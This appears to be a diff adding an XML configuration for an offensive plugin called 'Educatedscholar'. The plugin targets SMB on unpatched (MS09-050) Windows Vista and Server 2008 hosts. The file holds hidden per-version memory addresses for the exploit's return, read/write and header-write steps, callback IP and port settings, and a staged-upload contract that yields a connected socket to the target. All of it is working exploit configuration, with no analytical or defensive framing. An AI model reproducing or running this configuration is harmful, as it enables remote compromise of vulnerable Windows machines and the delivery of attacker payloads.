@@ -1,0 +1,149 @@
+<?xml version="1.0"?>
+<t:config id="2207e94cf3dca3559c5711a307a3f84aafa6247c"
+          name="Educatedscholar"
+          version="1.0.0"
+          configversion="1.0.0.0"
+          xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+          xmlns:t='tc0'>
+  <t:inputparameters>
+    <t:parameter name="TargetIp"
+                 description="Target IP Address"
+                 type="IPv4"
+                 binding="//identifier"/>
+    <t:parameter name="TargetPort"
+                 description="Port used by SMB"
+                 type="TcpPort"
+                 binding="//service[name='smb']/port"/>
+
+    <t:parameter name="CallbackIp"
+                 description="Callback IP Address"
+                 type="IPv4"/>
+    <t:parameter name="CallbackPort"
+                 description="Callback port"
+                 type="TcpPort"
+                 default="0"/>
+    <t:parameter name="CallbackLocalPort"
+                 description="Local callback port"
+                 type="TcpPort"
+                 required="false"/>
+    <t:parameter name="NetworkTimeout"
+                 description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout."
+                 type="S16"
+                 default="60"/>
+    <t:parameter name="PacketDelay"
+                 description="Milliseconds for delay between memory write packets"
+                 type="U16"
+                 hidden="true"
+                 value="150"/>
+
+    <!-- Need to differentiate between x86 and 64bit -->
+    <t:paramchoice name="Target" description="Target OS Version">
+        <t:paramgroup name="VistaSP1" description="">
+            <t:parameter name="ProcessIDHigh" description="" type="U16"
+                         value="0x01BB" hidden="true"/>
+            <t:parameter name="ReturnAddress" description="" type="U32"
+                         value="0xffdf0908" hidden="true"/>
+            <t:parameter name="HeaderWriteOffset" description="" type="U32"
+                         value="0x3fffffe6" hidden="true"/>
+            <t:parameter name="ReadWriteAddress" description="" type="U32"
+                         value="0xffdf0d04" hidden="true"/>
+            <t:parameter name="SetBitAddress" description="" type="U32"
+                         value="0xffdf0770" hidden="true"/>
+            <t:parameter name="ReadAddress" description="" type="U32"
+                         value="0xffdf02f4" hidden="true"/>
+        </t:paramgroup>
+        <t:paramgroup name="VistaSP2" description="">
+            <t:parameter name="ProcessIDHigh" description="" type="U16"
+                         value="0x01BB" hidden="true"/>
+            <t:parameter name="ReturnAddress" description="" type="U32"
+                         value="0xffdf0908" hidden="true"/>
+            <t:parameter name="HeaderWriteOffset" description="" type="U32"
+                         value="0x3fffffe7" hidden="true"/>
+            <t:parameter name="ReadWriteAddress" description="" type="U32"
+                         value="0xffdf0d04" hidden="true"/>
+            <t:parameter name="SetBitAddress" description="" type="U32"
+                         value="0xffdf0770" hidden="true"/>
+            <t:parameter name="ReadAddress" description="" type="U32"
+                         value="0xffdf02f4" hidden="true"/>
+        </t:paramgroup>
+        <t:paramgroup name="2K8SP1" description="">
+            <t:parameter name="ProcessIDHigh" description="" type="U16"
+                         value="0x01BB" hidden="true"/>
+            <t:parameter name="ReturnAddress" description="" type="U32"
+                         value="0xffdf0908" hidden="true"/>
+            <t:parameter name="HeaderWriteOffset" description="" type="U32"
+                         value="0x3fffffe6" hidden="true"/>
+            <t:parameter name="ReadWriteAddress" description="" type="U32"
+                         value="0xffdf0d04" hidden="true"/>
+            <t:parameter name="SetBitAddress" description="" type="U32"
+                         value="0xffdf0770" hidden="true"/>
+            <t:parameter name="ReadAddress" description="" type="U32"
+                         value="0xffdf02f4" hidden="true"/>
+        </t:paramgroup>
+        <t:paramgroup name="2K8SP2" description="">
+            <t:parameter name="ProcessIDHigh" description="" type="U16"
+                         value="0x01BB" hidden="true"/>
+            <t:parameter name="ReturnAddress" description="" type="U32"
+                         value="0xffdf0908" hidden="true"/>
+            <t:parameter name="HeaderWriteOffset" description="" type="U32"
+                         value="0x3fffffe7" hidden="true"/>
+            <t:parameter name="ReadWriteAddress" description="" type="U32"
+                         value="0xffdf0d04" hidden="true"/>
+            <t:parameter name="SetBitAddress" description="" type="U32"
+                         value="0xffdf0770" hidden="true"/>
+            <t:parameter name="ReadAddress" description="" type="U32"
+                         value="0xffdf02f4" hidden="true"/>
+        </t:paramgroup>
+    </t:paramchoice>
+
+  </t:inputparameters>
+  <t:outputparameters>
+    <t:parameter name="Contract"
+                 description="The contract fulfilled by this plugin"
+                 type="String"
+                 value="StagedUpload"/>
+    <t:parameter name="ConnectedTcp"
+                 description="Connected TCP Socket to target" 
+                 type="Socket"/>
+    <t:parameter name="XorMask"
+                 description=""
+                 type="U8"/>
+                 
+  </t:outputparameters>
+  <t:redirection>
+     <t:local protocol="TCP"
+              listenaddr="TargetIp"
+              listenport="TargetPort"
+              destaddr="//identifier"
+              destport="//service[name='smb']/port"
+              closeoncompletion="true"/>
+    <t:remote protocol="TCP"
+              listenaddr="CallbackIp"
+              listenport="CallbackPort"
+              destport="CallbackLocalPort"/>
+  </t:redirection>
+  <t:logic>
+    <t:and>
+      <t:service name="smb">
+        <t:bindtopath name="TargetPort" path="//service[name='smb']/port"/>    
+      </t:service>
+      <t:or>
+        <t:os family="windows" name="Windows Vista" servicepack="1">
+          <t:bindtovalue name="Target" value="VistaSP1"/>
+        </t:os>
+        <t:os family="windows" name="Windows Vista" servicepack="2">
+          <t:bindtovalue name="Target" value="VistaSP2"/>
+        </t:os>
+        <t:os family="windows" name="Windows 2008" servicepack="1">
+          <t:bindtovalue name="Target" value="2K8SP1"/>
+        </t:os>
+        <t:os family="windows" name="Windows 2008" servicepack="2">
+          <t:bindtovalue name="Target" value="2K8SP2"/>
+        </t:os>
+      </t:or>
+      <t:not>
+          <t:os_patch name="MS09-050"/>
+      </t:not>
+    </t:and>
+  </t:logic>
+</t:config>
